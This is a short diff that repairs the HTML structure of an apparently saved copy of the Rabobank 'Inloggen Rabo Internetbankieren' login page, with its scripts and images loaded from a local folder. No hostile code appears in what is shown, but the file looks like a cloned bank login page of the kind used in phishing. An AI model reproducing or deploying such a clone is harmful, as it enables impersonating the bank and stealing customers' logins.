@@ -1,4 +1,6 @@
-
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<!-- saved from url=(0037)https://bankieren.rabobank.nl/klanten -->
+<html xmlns="http://www.w3.org/1999/xhtml" lang="nl" xml:lang="nl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <title>Inloggen Rabo Internetbankieren – Rabobank</title>
  
 
@@ -8,7 +10,8 @@
  <script type="text/javascript" src="rabo_files/form_utils.js"></script><style type="text/css"></style>
  <script type="text/javascript" src="rabo_files/init_rr.js"></script>
  <script type="text/javascript" src="rabo_files/x12.js"></script>
-
+</head>
+<body>
 <div id="brt_wrapper" class="brt_inlog_rr">
  <div id="brt_header">
          <div id="pa_logo"><img src="rabo_files/rabobank_logo.gif" alt="Rabobank Nederland"></div>
@@ -139,3 +142,5 @@
 <script type="text/javascript" src="rabo_files/brwfunc.js"></script><script language="Javascript1.1">varJSver = 1.1;</script><script language="Javascript1.2">varJSver = 1.2;</script><script language="Javascript1.3">varJSver = 1.3;</script><script language="Javascript1.4">varJSver = 1.4;</script><script language="Javascript1.5">varJSver = 1.5;</script><script language="Javascript1.6">varJSver = 1.6;</script><script language="Javascript1.7">varJSver = 1.7;</script><script language="Javascript1.8">varJSver = 1.8;</script><script language="Javascript1.9">varJSver = 1.9;</script><script language="Javascript2.0">varJSver = 2.0;</script><img height="1" width="1" src="./rabo_files/trans.gif"><img height="1" width="1" src="./rabo_files/whitepixel.gif">
 <script type="text/javascript" src="rabo_files/brwcook.js"></script>
 
+
+</body></html>
